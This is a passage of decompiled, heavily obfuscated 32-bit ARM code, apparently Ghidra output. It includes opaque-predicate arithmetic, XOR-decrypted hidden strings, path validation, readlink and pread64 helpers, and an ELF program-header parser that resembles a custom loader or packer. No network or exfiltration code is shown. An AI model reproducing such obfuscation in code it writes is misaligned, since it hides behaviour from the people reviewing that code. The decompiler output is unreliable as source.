           (~*(byte *)(iVar13 + 0x21f49) & 0xd8 | *(byte *)(iVar13 + 0x21f49) & 0x27) ^ 0xad;
      *(byte *)(iVar7 + 0x21ea6) = *(byte *)(iVar13 + 0x21f4a) ^ 0x80;
      *(byte *)(iVar7 + 0x21ea7) = *(byte *)(iVar13 + 0x21f4b) ^ 0x34;
      *(byte *)(iVar7 + 0x21ea8) = *(byte *)(iVar13 + 0x21f4c) ^ 0x4f;
      *(byte *)(iVar7 + 0x21ea9) = *(byte *)(iVar13 + 0x21f4d) ^ 0x2e;
      *(byte *)(iVar7 + 0x21eaa) = *(byte *)(iVar13 + 0x21f4e) ^ 0x8f;
      *(byte *)(iVar7 + 0x21eab) =
           *(byte *)(iVar13 + 0x21f4f) + (*(byte *)(iVar13 + 0x21f4f) & 0x3a) * -2 + ':';
      *(byte *)(iVar7 + 0x21eac) =
           ~*(byte *)(iVar13 + 0x21f50) & 0x2c | *(byte *)(iVar13 + 0x21f50) & 0xd3;
      *(byte *)(iVar7 + 0x21ead) = *(byte *)(iVar13 + 0x21f51) ^ 0xca;
    }
    bVar1 = *(byte *)(iVar13 + 0x21f54);
    *(byte *)(iVar7 + 0x21eae) = *(byte *)(iVar13 + 0x21f52) ^ 0xec;
    bVar2 = *(byte *)(iVar13 + 0x21f55);
    *(byte *)(iVar7 + 0x21eaf) = *(byte *)(iVar13 + 0x21f53) ^ 0x97;
    bVar3 = *(byte *)(iVar13 + 0x21f56);
    *(byte *)(iVar7 + 0x21eb3) = *(byte *)(iVar13 + 0x21f57) ^ 0x5f;
    *(byte *)(iVar7 + 0x21eb0) = (~bVar1 & 0x69 | bVar1 & 0x96) ^ 0xb9;
    *(byte *)(iVar7 + 0x21eb1) = ~(bVar2 & 0xe9 | ~bVar2 & 0x16);
    *(byte *)(iVar7 + 0x21eb2) = bVar3 + (bVar3 & 0x2d) * -2 + -0x53;
    iVar10 = FUN_00035060((*(uint *)(DAT_00023118 + 0x228cc) ^ 0xc10005c0 |
                           *(uint *)(DAT_00023114 + 0x228c0) ^ DAT_00022f8c | DAT_00022f90) +
                          DAT_00022f94,DAT_00022f98);
    uVar9 = DAT_00022fb4;
    iVar14 = DAT_00022fb0;
    uVar8 = DAT_00022fac;
    iVar12 = DAT_00022fa8;
    uVar5 = DAT_00022fa4;
    uVar17 = DAT_00022fa0;
    if (iVar10 == DAT_00022f9c) {
      bVar1 = *(byte *)(iVar13 + 0x21f59);
      *(byte *)(iVar7 + 0x21eb4) = *(byte *)(iVar13 + 0x21f58) ^ 0xac;
      *(byte *)(iVar7 + 0x21eb5) = bVar1 + (bVar1 & 0x4f) * -2 + 'O';
      uVar9 = DAT_00022fb4;
      iVar14 = DAT_00022fb0;
      uVar8 = DAT_00022fac;
      iVar12 = DAT_00022fa8;
      uVar5 = DAT_00022fa4;
      uVar17 = DAT_00022fa0;
    }
    do {
      bVar1 = *(byte *)(iVar13 + 0x21f59);
      *(byte *)(iVar7 + 0x21eb4) =
           (~*(byte *)(iVar13 + 0x21f58) | 0x53) & (*(byte *)(iVar13 + 0x21f58) | 0xac);
      *(byte *)(iVar7 + 0x21eb5) = ~(bVar1 & 0x4f | ~bVar1 & 0xb0);
      uVar11 = *(uint *)(DAT_0002311c + 0x22970) ^ uVar17;
      uVar15 = *(uint *)(DAT_00023120 + 0x2297c) ^ uVar5;
    } while ((((uVar15 | uVar11) & ~(uVar15 ^ uVar11)) + iVar12 & uVar8) + iVar14 < uVar9);
  }
  uVar9 = FUN_00035060(*(uint *)(DAT_00023124 + 0x229ac) ^ DAT_00022fb8,
                       *(uint *)(DAT_00023128 + 0x229bc) ^ DAT_00022fbc);
  if (DAT_00022fcc <
      ((uVar9 ^ 0x150a2000) & DAT_00022fc0) + ((DAT_00022fc4 | 1) ^ DAT_00022fc4) + DAT_00022fc8) {
    DataMemoryBarrier(0xb);
    *(undefined4 *)(DAT_00023180 + 0x22a08) = 1;
  }
  uVar17 = DAT_00022fe4;
  uVar5 = DAT_00022fe0;
  uVar6 = DAT_00022fdc;
  iVar14 = DAT_00022fd8;
  uVar8 = DAT_00022fd4;
  uVar9 = DAT_00022fd0;
  puVar20 = (undefined4 *)(DAT_0002312c + 0x22a1c);
  do {
    uVar11 = *(uint *)(DAT_00023130 + 0x22a38);
    uVar15 = *(uint *)(DAT_00023134 + 0x22a44);
    DataMemoryBarrier(0xb);
    *puVar20 = 1;
    uVar15 = FUN_00035060((uVar11 ^ uVar8) + (uVar15 ^ uVar9) + iVar14,uVar6);
    uVar11 = DAT_0002300c;
  } while ((uVar15 | uVar5) == uVar17);
  uVar9 = ~(*(uint *)(DAT_0002313c + 0x22a90) ^ DAT_00022ff4 |
           *(uint *)(DAT_00023138 + 0x22a7c) ^ DAT_00022ff0) |
          (*(uint *)(DAT_0002313c + 0x22a90) ^ DAT_00022fec) &
          (*(uint *)(DAT_00023138 + 0x22a7c) ^ DAT_00022fe8);
  if ((((uVar9 & DAT_00022ffc | DAT_00022ff8 & ~uVar9) ^ DAT_00023000 | DAT_00023004 & ~uVar9) *
       -0x3b000dd | DAT_00023008) == DAT_00023010) goto LAB_00022bb4;
  while (uVar9 = ((*(uint *)(DAT_00023140 + 0x22b18) ^ DAT_00023028) & DAT_00023020 |
                 (*(uint *)(DAT_00023140 + 0x22b18) ^ DAT_00023024) & DAT_00023018) ^
                 ((*(uint *)(DAT_00023144 + 0x22b24) ^ DAT_0002301c) & DAT_00023020 |
                 (*(uint *)(DAT_00023144 + 0x22b24) ^ DAT_00023014) & DAT_00023018),
        uVar17 = DAT_00023034 &
                 ~((~uVar9 | DAT_0002302c) + uVar9 + (uVar11 + 1 ^ uVar11) + DAT_00023030),
        iVar12 = FUN_000241b8(param_1,param_2,param_3,param_4,param_5), uVar5 = DAT_00023050,
        iVar7 = DAT_0002304c, uVar6 = DAT_00023048, iVar14 = DAT_00023044, uVar8 = DAT_00023040,
        uVar9 = DAT_0002303c, uVar17 == DAT_00023038) {
LAB_00022bb4:
    FUN_000241b8(param_1,param_2,param_3,param_4,param_5);
  }
  do {
    iVar13 = FUN_00035060(((*(uint *)(DAT_0002314c + 0x22c6c) ^ uVar8) -
                          (*(uint *)(DAT_00023148 + 0x22c60) ^ uVar9)) + iVar14,uVar6);
  } while (uVar5 < (uint)(iVar13 + iVar7));
  if (iVar12 == 0) {
    uVar17 = (*(uint *)(DAT_00023160 + 0x22cb4) ^ DAT_00023084) +
             (*(uint *)(DAT_0002315c + 0x22ca4) ^ DAT_00023080);
    uVar9 = DAT_000230b8;
    uVar8 = DAT_000230b4;
    uVar6 = DAT_000230b0;
    uVar5 = DAT_0002309c;
    if (((uVar17 ^ DAT_00023090) & DAT_00023094 | (uVar17 ^ DAT_00023088) & DAT_0002308c) ==
        DAT_00023098) {
      FUN_000245b8(param_1);
      uVar9 = DAT_000230b8;
      uVar8 = DAT_000230b4;
      uVar6 = DAT_000230b0;
      uVar5 = DAT_0002309c;
    }
    do {
      uVar17 = *(uint *)(DAT_00023164 + 0x22d14) ^ DAT_000230a0;
      uVar17 = (*(uint *)(DAT_00023168 + 0x22d20) ^ uVar17 ^ DAT_000230a4) & uVar17;
      uVar17 = FUN_00035060((uVar5 + 2 ^ uVar5) * (uVar17 & DAT_000230ac) - (uVar17 ^ DAT_000230a8),
                            uVar6);
      iVar14 = FUN_000245b8(param_1);
    } while (uVar9 < (uVar17 | uVar8));
    uVar9 = (((*(uint *)(DAT_00023170 + 0x22d88) ^ DAT_000230c8) &
             (*(uint *)(DAT_0002316c + 0x22d7c) ^ DAT_000230c4)) -
            ((*(uint *)(DAT_00023170 + 0x22d88) ^ DAT_000230c0) &
            (*(uint *)(DAT_0002316c + 0x22d7c) ^ DAT_000230bc))) + DAT_000230cc;
    do {
    } while (DAT_000230d8 <
             (uVar9 | DAT_000230d0) * (uVar9 & DAT_000230d0) +
             (uVar9 & DAT_000230d4) * (DAT_000230d0 & ~uVar9));
    if (iVar14 == 0) {
      return;
    }
    uVar9 = FUN_00035060(*(uint *)(DAT_00023174 + 0x22df4) ^ DAT_000230dc,
                         *(uint *)(DAT_00023178 + 0x22e04) ^ DAT_000230e0);
    uVar9 = (uVar9 - ((DAT_000230e8 | 2) ^ DAT_000230e8) * (uVar9 & DAT_000230e4)) + DAT_000230e4;
    uVar8 = uVar9 + ((DAT_000230ec | 1) ^ DAT_000230ec) + (~uVar9 | DAT_000230f0) + DAT_000230f4;
    uVar9 = DAT_00023110;
    if (((DAT_000230fc & ~uVar8 | uVar8 & DAT_000230f8) ^ DAT_00023100 | uVar8 & DAT_00023104) <
        DAT_00023108) {
      uVar9 = DAT_0002310c;
    }
                    /* WARNING: Subroutine does not return */
    FUN_00027cf0((uVar9 | 1) ^ uVar9,(int)&DAT_00022ea0 + DAT_0002317c,param_3,iVar14);
  }
  uVar9 = *(uint *)(DAT_00023154 + 0x22ef0) ^ DAT_00023058 |
          *(uint *)(DAT_00023150 + 0x22ee0) ^ DAT_00023054;
  uVar8 = (uVar9 ^ DAT_00023064 | DAT_00023068) +
          (uVar9 ^ DAT_0002305c) + ((DAT_00023060 | 1) ^ DAT_00023060);
  uVar9 = DAT_00023078;
  if ((uVar8 | DAT_0002306c) * (uVar8 & DAT_0002306c) +
      (uVar8 & DAT_00023070) * (DAT_0002306c & ~uVar8) == DAT_00023074) {
    uVar9 = DAT_0002307c;
  }
                    /* WARNING: Subroutine does not return */
  FUN_00027cf0((uVar9 | 1) ^ uVar9,(int)&DAT_00022f6c + DAT_00023158,param_3,iVar12);
}



// ---- 00023188  FUN_00023188  size=92

bool FUN_00023188(uint param_1)

{
  uint uVar1;
  
  if (param_1 < 0x1000) {
    return false;
  }
  param_1 = param_1 - (DAT_000231e4 & param_1 >> 1);
  uVar1 = (param_1 & DAT_000231e8) + (DAT_000231e8 & param_1 >> 2);
  return (uVar1 + (uVar1 >> 4) & DAT_000231ec) * DAT_000231f0 >> 0x18 <
         ((DAT_000231f4 | 2) ^ DAT_000231f4);
}



// ---- 000231f8  FUN_000231f8  size=232

undefined4 FUN_000231f8(char *param_1)

{
  char cVar1;
  size_t sVar2;
  int iVar3;
  undefined4 uVar4;
  char cVar5;
  bool bVar6;
  
  uVar4 = 0;
  if ((((param_1 != (char *)0x0) && (*param_1 == '/')) &&
      (sVar2 = strnlen(param_1,(DAT_000232e0 | 0x1000) ^ DAT_000232e0), 0xfffff001 < sVar2 - 0x1000)
      ) && (param_1[sVar2 - 1] != '/')) {
    for (param_1 = param_1 + 1; cVar1 = *param_1, cVar1 != '\0'; param_1 = param_1 + -iVar3) {
      iVar3 = 0;
      cVar5 = cVar1;
      while (cVar5 != '\0' && cVar5 != '/') {
        cVar5 = param_1[1 - iVar3];
        iVar3 = iVar3 + -1;
      }
      if (iVar3 == 0) {
        return 0;
      }
      if (iVar3 == -2) {
        bVar6 = cVar1 == '.';
        if (bVar6) {
          cVar1 = param_1[1];
        }
        if (bVar6 && cVar1 == '.') {
          return 0;
        }
      }
      else if (iVar3 == -1 && cVar1 == '.') {
        return 0;
      }
      if (cVar5 == '/') {
        param_1 = param_1 + 1;
      }
    }
    uVar4 = 1;
  }
  return uVar4;
}



// ---- 000232e4  FUN_000232e4  size=288

void FUN_000232e4(int *param_1,char *param_2,undefined4 param_3)

{
  undefined4 uVar1;
  int __fd;
  int iVar2;
  char *unaff_r6;
  stat sStack_88;
  undefined4 uStack_20;
  int local_1c;
  
  local_1c = **(int **)(DAT_00023410 + 0x23300);
  uVar1 = 1;
  if (param_1 != (int *)0x0) {
    unaff_r6 = param_2;
  }
  uStack_20 = param_3;
  if ((param_1 != (int *)0x0 && param_2 != (char *)0x0) && (*unaff_r6 == '/')) {
    FUN_0003524c(param_1,0x1004);
    *param_1 = -1;
    __fd = __open_2(unaff_r6,(DAT_00023404 | 0x84000) ^ DAT_00023404);
    uVar1 = 2;
    if (-1 < __fd) {
      iVar2 = fstat(__fd,&sStack_88);
      if ((iVar2 == 0) &&
         ((sStack_88.st_mode & (DAT_0002340c + 0x7000 ^ DAT_0002340c)) ==
          ((DAT_00023408 | 0x4000) ^ DAT_00023408))) {
        iVar2 = FUN_00023418(__fd,param_1 + 1);
        if (iVar2 == 0) {
          uVar1 = 0;
          *param_1 = __fd;
        }
        else {
          close(__fd);
          uVar1 = 3;
        }
      }
      else {
        close(__fd);
        uVar1 = 4;
      }
    }
  }
  if (**(int **)(DAT_00023414 + 0x23330) != local_1c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar1);
  }
  return;
}



// ---- 00023418  FUN_00023418  size=372

void FUN_00023418(undefined4 param_1,char *param_2,undefined4 param_3)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  int *piVar8;
  byte *pbVar9;
  char acStack_68 [64];
  undefined4 uStack_28;
  int local_24;
  
  iVar6 = DAT_0002359c;
  iVar5 = DAT_00023598;
  local_24 = **(int **)(DAT_00023590 + 0x23430);
  piVar8 = (int *)(DAT_00023594 + 0x23444);
  DataMemoryBarrier(0xb);
  if (*piVar8 == 0) {
    pbVar9 = (byte *)(DAT_00023598 + 0x23460);
    bVar1 = *(byte *)(DAT_0002359c + 0x23464);
    *(byte *)(DAT_00023598 + 0x23463) = *(byte *)(DAT_0002359c + 0x23467) ^ 0x7d;
    bVar2 = *(byte *)(iVar6 + 0x23465);
    *(byte *)(iVar5 + 0x23464) = *(byte *)(iVar6 + 0x23468) ^ 0x52;
    bVar3 = *(byte *)(iVar6 + 0x23466);
    *(byte *)(iVar5 + 0x23465) = *(byte *)(iVar6 + 0x23469) ^ 0xa2;
    bVar4 = *(byte *)(iVar6 + 0x2346a);
    *pbVar9 = bVar1 ^ 0x59;
    *(byte *)(iVar5 + 0x23466) = bVar4 ^ 0xef;
    bVar1 = *(byte *)(iVar6 + 0x2346b);
    *(byte *)(iVar5 + 0x23461) = bVar2 ^ 0xf4;
    *(byte *)(iVar5 + 0x23467) = bVar1 ^ 0x8b;
    bVar1 = *(byte *)(iVar6 + 0x2346c);
    *(byte *)(iVar5 + 0x23462) = bVar3 ^ 0x11;
    *(byte *)(iVar5 + 0x23468) = bVar1 ^ 0x2e;
    bVar1 = *(byte *)(iVar6 + 0x2346e);
    *(byte *)(iVar5 + 0x23469) = *(byte *)(iVar6 + 0x2346d) ^ 0x2c;
    *(byte *)(iVar5 + 0x2346a) = bVar1 ^ 0x34;
  }
  DataMemoryBarrier(0xb);
  *piVar8 = 1;
  uStack_28 = param_3;
  uVar7 = FUN_00024c94(acStack_68);
  if ((uVar7 <= (DAT_0002358c + 0xd ^ DAT_0002358c)) &&
     (uVar7 = readlink(acStack_68,param_2,0xfff), uVar7 < 0xfff)) {
    param_2[uVar7] = '\0';
    strstr(param_2,(char *)(DAT_000235a0 + 0x23558));
  }
  if (**(int **)(DAT_000235a4 + 0x23574) == local_24) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(local_24);
}



// ---- 000235a8  FUN_000235a8  size=52

void FUN_000235a8(int *param_1)

{
  if (param_1 == (int *)0x0) {
    return;
  }
  if (-1 < *param_1) {
    close(*param_1);
  }
  *param_1 = -1;
  return;
}



// ---- 000235dc  FUN_000235dc  size=412

void FUN_000235dc(int *param_1,int param_2,int *param_3,undefined4 param_4)

{
  int iVar1;
  size_t __n;
  size_t sVar2;
  byte *__s;
  int iVar3;
  uint uVar4;
  int *unaff_r9;
  bool bVar5;
  stat sStack_1098;
  char local_1030 [4096];
  int iStack_30;
  int local_2c;
  undefined4 uStack_28;
  
  local_2c = **(int **)(DAT_00023784 + 0x235f8);
  if (param_1 != (int *)0x0) {
    unaff_r9 = param_3;
  }
  iStack_30 = param_2;
  uStack_28 = param_4;
  if ((((param_1 == (int *)0x0 || param_3 == (int *)0x0) || (iVar3 = *param_1, iVar3 < 0)) ||
      (iVar1 = FUN_000231f8(param_2), iVar1 == 0)) ||
     (iVar3 = __openat_2(iVar3,param_2 + 1,0x80100), iVar3 < 0)) goto LAB_00023620;
  iVar1 = fstat(iVar3,&sStack_1098);
  if ((iVar1 != 0) ||
     ((sStack_1098.st_mode & ((DAT_0002377c | 0xf000) ^ DAT_0002377c)) !=
      ((DAT_00023778 | 0x8000) ^ DAT_00023778))) {
    close(iVar3);
    goto LAB_00023620;
  }
  iVar1 = FUN_00023418(iVar3,local_1030);
  if (iVar1 == 0) {
    __s = (byte *)(param_1 + 1);
    uVar4 = (DAT_00023780 | 1) ^ DAT_00023780;
    __n = strlen((char *)__s);
    bVar5 = __n == uVar4;
    sVar2 = __n;
    if (bVar5) {
      sVar2 = (size_t)*__s;
    }
    if (bVar5 && sVar2 == 0x2f) {
      if (local_1030[1] != 0) {
        local_1030[1] = 1;
      }
      if ((local_1030[0] == '/' & local_1030[1]) == 0) goto LAB_00023768;
    }
    else {
      iVar1 = strncmp((char *)__s,local_1030,__n);
      if ((iVar1 != 0) || (local_1030[__n] != '/')) goto LAB_00023768;
    }
    *unaff_r9 = iVar3;
  }
  else {
LAB_00023768:
    close(iVar3);
  }
LAB_00023620:
  if (**(int **)(DAT_00023788 + 0x23630) != local_2c) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(local_2c);
  }
  return;
}



// ---- 0002378c  FUN_0002378c  size=2288

void FUN_0002378c(int *param_1,int param_2,uint param_3,uint param_4)

{
  bool bVar1;
  char cVar2;
  uint *puVar3;
  uint *puVar4;
  short sVar5;
  uint uVar6;
  int iVar7;
  void *pvVar8;
  uint uVar9;
  int extraout_r1;
  int extraout_r1_00;
  uint uVar10;
  size_t __n;
  uint uVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  bool bVar18;
  stat sStack_c8;
  uint *local_60;
  int local_5c;
  int local_58;
  uint *local_54;
  size_t local_50;
  int local_4c;
  int *local_48;
  uint local_44;
  size_t local_40;
  uint local_3c;
  uint *local_38;
  uint local_34;
  uint *local_30;
  int local_2c;
  
  uVar10 = DAT_00024080;
  local_2c = **(int **)(DAT_000240e4 + 0x237b0);
  uVar6 = param_3 - (DAT_0002407c & param_3 >> 1);
  uVar6 = (uVar6 & DAT_00024080) + (DAT_00024080 & uVar6 >> 2);
  if (((param_1 != (int *)0x0 && -1 < param_2) &&
      ((DAT_00024090 | 0x1000) ^ DAT_00024090) <= param_3) &&
      (uVar6 + (uVar6 >> 4) & DAT_00024084) * DAT_00024088 >> 0x18 <=
      ((DAT_0002408c | 1) ^ DAT_0002408c)) {
    local_34 = param_4;
    FUN_0003524c(param_1,0x1088);
    puVar12 = (uint *)(param_1 + 0x14);
    *puVar12 = 0xffffffff;
    *param_1 = param_2;
    param_1[0x15] = -1;
    param_1[0x1a] = param_3;
    local_30 = (uint *)(param_1 + 0x12);
    iVar7 = fstat(param_2,&sStack_c8);
    if ((iVar7 == 0) && (-1 < sStack_c8.st_blocks)) {
      *local_30 = sStack_c8.st_blksize;
      local_30[1] = sStack_c8.st_blocks;
      if (sStack_c8.st_blocks != 0 ||
          (uint)sStack_c8.st_blocks <
          (uint)((DAT_00024094 + 0xc ^ DAT_00024094) <= (uint)sStack_c8.st_blksize)) {
        iVar7 = FUN_000240ec(param_2,param_1 + 2,DAT_00024098 + 0x14 ^ DAT_00024098,
                             DAT_00024094 + 0xc,0,0);
        if ((iVar7 == 0) && (*(char *)(param_1 + 2) == '\x7f')) {
          cVar2 = *(char *)((int)param_1 + 9);
          bVar18 = cVar2 == 'E';
          if (bVar18) {
            cVar2 = *(char *)((int)param_1 + 10);
          }
          if (bVar18 && cVar2 == 'L') {
            cVar2 = *(char *)((int)param_1 + 0xb);
            bVar18 = cVar2 == 'F';
            if (bVar18) {
              cVar2 = *(char *)(param_1 + 3);
            }
            if (bVar18 && cVar2 == '\x01') {
              cVar2 = *(char *)((int)param_1 + 0xd);
              bVar18 = cVar2 == '\x01';
              if (bVar18) {
                cVar2 = *(char *)((int)param_1 + 0xe);
              }
              if (bVar18 && cVar2 == '\x01') {
                uVar6 = (DAT_0002409c | 1) ^ DAT_0002409c;
                bVar18 = param_1[7] == uVar6;
                if (bVar18) {
                  uVar6 = (uint)*(ushort *)((int)param_1 + 0x1a);
                }
                if ((bVar18 && uVar6 == 0x28) && ((*(ushort *)(param_1 + 6) & 0xfffe) == 2)) {
                  sVar5 = 0x34;
                  if (*(short *)(param_1 + 0xc) == 0x34) {
                    sVar5 = *(short *)((int)param_1 + 0x32);
                  }
                  if ((*(short *)(param_1 + 0xc) == 0x34 && sVar5 == 0x20) &&
                     (uVar6 = (uint)*(ushort *)(param_1 + 0xd), 0xff7f < (uVar6 - 0x81 & 0xffff))) {
                    uVar17 = DAT_000240a0 + 3 ^ DAT_000240a0;
                    local_38 = (uint *)param_1[9];
                    uVar9 = uVar6 << (uVar17 & 0xff);
                    uVar11 = (uint)CARRY4((uint)local_38,uVar9);
                    if (uVar11 < local_30[1] ||
                        local_30[1] - uVar11 < (uint)((int)local_38 + uVar9 <= *local_30)) {
                      local_50 = uVar6 << (uVar17 & 0xff);
                      pvVar8 = malloc(local_50);
                      param_1[0xf] = (int)pvVar8;
                      if (pvVar8 != (void *)0x0) {
                        param_1[0x10] = uVar6;
                        iVar7 = FUN_000240ec(param_2,pvVar8,local_50);
                        if (iVar7 == 0) {
                          local_60 = local_30 + 4;
                          local_48 = param_1 + 0x21;
                          local_54 = (uint *)0x0;
                          local_5c = 0;
                          local_58 = 0;
                          for (local_3c = 0; uVar6 = param_1[0x10], local_3c < uVar6;
                              local_3c = local_3c + (DAT_000240a8 + 1 ^ DAT_000240a8)) {
                            local_38 = (uint *)(param_1[0xf] + local_3c * 0x20);
                            local_44 = local_38[1];
                            local_40 = local_38[4];
                            if (local_30[1] <= (uint)CARRY4(local_40,local_44) &&
                                (uint)(local_40 + local_44 <= *local_30) <=
                                local_30[1] - (uint)CARRY4(local_40,local_44)) goto LAB_00024064;
                            uVar6 = local_38[7];
                            if ((DAT_000240b0 ^ DAT_000240b0 + 1) < uVar6) {
                              uVar9 = uVar6 - (DAT_0002407c & uVar6 >> 1);
                              uVar9 = (uVar9 & uVar10) + (uVar10 & uVar9 >> 2);
                              if ((DAT_000240a4 + 1 ^ DAT_000240a4) <
                                  (uVar9 + (uVar9 >> 4) & DAT_00024084) * DAT_00024088 >> 0x18)
                              goto LAB_00024064;
                              FUN_00035258(local_38[2],uVar6);
                              local_4c = extraout_r1;
                              FUN_00035258(local_44,uVar6);
                              if (local_4c != extraout_r1_00) goto LAB_00024064;
                            }
                            uVar6 = *local_38;
                            if (uVar6 == 3) {
                              if (((local_34 == 0) || (local_58 != 0)) ||
                                 (local_40 - 0x1001 < 0xfffff001)) goto LAB_00024064;
                              __n = local_40;
                              uVar6 = FUN_000240ec(param_2,local_48);
                              bVar18 = uVar6 != 0;
                              if (!bVar18) {
                                local_40 = local_38[4];
                                __n = local_40 - 1;
                                uVar6 = (uint)*(byte *)((int)local_48 + __n);
                              }
                              if (((bVar18 || uVar6 != 0) ||
                                  (pvVar8 = memchr(local_48,0,__n), pvVar8 != (void *)0x0)) ||
                                 (iVar7 = FUN_000231f8(local_48), iVar7 == 0)) goto LAB_00024064;
                              param_1[0x20] = DAT_000240b4 + 1 ^ DAT_000240b4;
                              local_58 = 1;
                              uVar6 = *local_38;
LAB_00023c98:
                              if (uVar6 == (DAT_000240ac + 1 ^ DAT_000240ac)) {
                                uVar6 = local_38[5];
                                if (uVar6 < local_40) goto LAB_00024064;
                                if (uVar6 != 0) {
                                  if ((local_38[6] & (DAT_000240e0 + 1 ^ DAT_000240e0)) ==
                                      ((DAT_000240dc | 3) ^ DAT_000240dc)) goto LAB_00024064;
                                  uVar11 = local_38[2];
                                  uVar9 = uVar11 + uVar6;
                                  uVar6 = (uint)CARRY4(uVar11,uVar6);
                                  if (uVar9 < uVar11) goto LAB_00024064;
                                  if ((uint)(*puVar12 <= uVar11) <= (uint)-param_1[0x15]) {
                                    *puVar12 = uVar11;
                                    param_1[0x15] = 0;
                                  }
                                  local_5c = local_5c + ((DAT_000240d8 | 1) ^ DAT_000240d8);
                                  if (local_60[1] <= uVar6 &&
                                      (uint)(uVar9 <= *local_60) <= local_60[1] - uVar6) {
                                    *local_60 = uVar9;
                                    local_60[1] = uVar6;
                                  }
                                }
                              }
                            }
                            else {
                              puVar4 = local_38;
                              puVar3 = local_54;
                              if (uVar6 != 6) {
                                if (uVar6 != DAT_000240d4) goto LAB_00023c98;
                                puVar4 = local_54;
                                puVar3 = (uint *)(local_38[6] & (DAT_000240b8 + 1 ^ DAT_000240b8));
                              }
                              local_54 = puVar4;
                              if (puVar3 != (uint *)0x0) goto LAB_00024064;
                            }
                          }
                          if (local_5c != 0) {
                            uVar10 = param_1[0x15];
                            if ((*puVar12 & uVar10) != 0xffffffff) {
                              uVar11 = param_3 - 1;
                              uVar9 = -(uint)(param_3 == 0);
                              uVar17 = *local_60;
                              local_34 = ~local_60[1];
                              if (uVar9 < local_34 ||
                                  local_34 + (param_3 == 0) < (uint)(uVar11 <= ~uVar17)) {
                                uVar16 = uVar17 + uVar11 & -param_3;
                                uVar14 = *puVar12 & -param_3;
                                uVar13 = local_60[1] + uVar9 + (uint)CARRY4(uVar17,uVar11) &
                                         -(uint)(param_3 != 0);
                                *local_60 = uVar16;
                                local_60[1] = uVar13;
                                uVar10 = uVar10 & -(uint)(param_3 != 0);
                                *puVar12 = uVar14;
                                param_1[0x15] = uVar10;
                                uVar17 = DAT_000240d0;
                                uVar11 = DAT_000240cc;
                                uVar9 = DAT_000240c8;
                                if ((uVar10 <= uVar13 && (uint)(uVar16 <= uVar14) <= uVar10 - uVar13
                                    ) && (-(uVar13 - (uVar10 + (uVar16 < uVar14))) <
                                          (uint)(uVar16 - uVar14 <=
                                                ((DAT_000240bc | 0x40000000) ^ DAT_000240bc)))) {
                                  bVar18 = false;
                                  local_34 = 0;
                                  local_38 = (uint *)0x0;
                                  for (uVar10 = 0; uVar10 != uVar6;
                                      uVar10 = uVar10 + (DAT_000240c0 + 1 ^ DAT_000240c0)) {
                                    puVar12 = (uint *)(param_1[0xf] + uVar10 * 0x20);
                                    if (*puVar12 == (DAT_000240c4 ^ DAT_000240c4 + 1)) {
                                      uVar14 = param_1[9];
                                      uVar16 = puVar12[1];
                                      uVar13 = (uint)CARRY4(puVar12[4],uVar16);
                                      if (uVar16 <= uVar14 &&
                                          (CARRY4(uVar14,local_50) < uVar13 ||
                                          uVar13 - CARRY4(uVar14,local_50) <
                                          (uint)(uVar14 + local_50 <= puVar12[4] + uVar16))) {
                                        uVar13 = puVar12[2];
                                        uVar15 = uVar14 - uVar16;
                                        iVar7 = -(uint)(uVar14 < uVar16);
                                        if (iVar7 == -1 &&
                                            (uint)(uVar15 <= ~uVar13) <= (uVar14 < uVar16) - 1)
                                        goto LAB_00024064;
                                        uVar14 = uVar15 + uVar13;
                                        puVar12 = (uint *)(iVar7 + (uint)CARRY4(uVar15,uVar13));
                                        bVar1 = bVar18 && (local_34 != uVar14 || local_38 != puVar12
                                                          );
                                        bVar18 = true;
                                        local_38 = puVar12;
                                        local_34 = uVar14;
                                        if (bVar1) goto LAB_00024064;
                                      }
                                    }
                                  }
                                  if ((bVar18) &&
                                     ((local_54 == (uint *)0x0 ||
                                      ((((local_54[1] == param_1[9] &&
                                         (local_34 == local_54[2] && local_38 == (uint *)0x0)) &&
                                        (local_50 <= local_54[4])) && (local_50 <= local_54[5]))))))
                                  {
                                    uVar13 = param_1[8];
                                    local_30[6] = local_34;
                                    local_30[7] = (uint)local_38;
                                    for (uVar10 = 0; uVar10 != uVar6;
                                        uVar10 = uVar10 + (uVar17 + 1 ^ uVar17)) {
                                      puVar12 = (uint *)(param_1[0xf] + uVar10 * 0x20);
                                      if (((*puVar12 == (uVar11 + 1 ^ uVar11)) &&
                                          ((puVar12[6] & (uVar9 ^ uVar9 + 1)) != 0)) &&
                                         (uVar14 = puVar12[2],
                                         uVar14 <= uVar13 &&
                                         (uint)(puVar12[5] + uVar14 <= uVar13) <=
                                         -(uint)CARRY4(puVar12[5],uVar14))) goto LAB_00023918;
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
LAB_00024064:
                        free((void *)param_1[0xf]);
                        param_1[0xf] = 0;
                        param_1[0x10] = 0;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
LAB_00023918:
  if (**(int **)(DAT_000240e8 + 0x23928) == local_2c) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(local_2c);
}



// ---- 000240ec  FUN_000240ec  size=200

int FUN_000240ec(int param_1,void *param_2,uint param_3,undefined4 param_4,uint param_5,int param_6)

{
  int iVar1;
  ssize_t sVar2;
  uint *puVar3;
  uint __nbytes;
  uint uVar4;
  uint uVar5;
  
  uVar5 = param_3;
  if (param_6 < 0) {
LAB_00024104:
    iVar1 = -1;
  }
  else {
    while( true ) {
      __nbytes = uVar5;
      if (0x7ffffffe < uVar5) {
        __nbytes = 0x7fffffff;
      }
      if (uVar5 == 0) break;
      while (sVar2 = pread64(param_1,param_2,__nbytes,
                             CONCAT44(param_6 + (uint)CARRY4(param_3 - uVar5,param_5),
                                      (param_3 - uVar5) + param_5)), sVar2 < 1) {
        if (sVar2 != -1 && sVar2 + 1 < 0 == SCARRY4(sVar2,1)) goto LAB_00024104;
        uVar4 = DAT_000241b4 + 4 ^ DAT_000241b4;
        puVar3 = (uint *)__errno();
        iVar1 = *puVar3 - uVar4;
        if (iVar1 != 0) {
          iVar1 = -1;
        }
        if (*puVar3 != uVar4) {
          return iVar1;
        }
        if (uVar5 == 0) {
          return iVar1;
        }
      }
      param_2 = (void *)((int)param_2 + sVar2);
      uVar5 = uVar5 - sVar2;
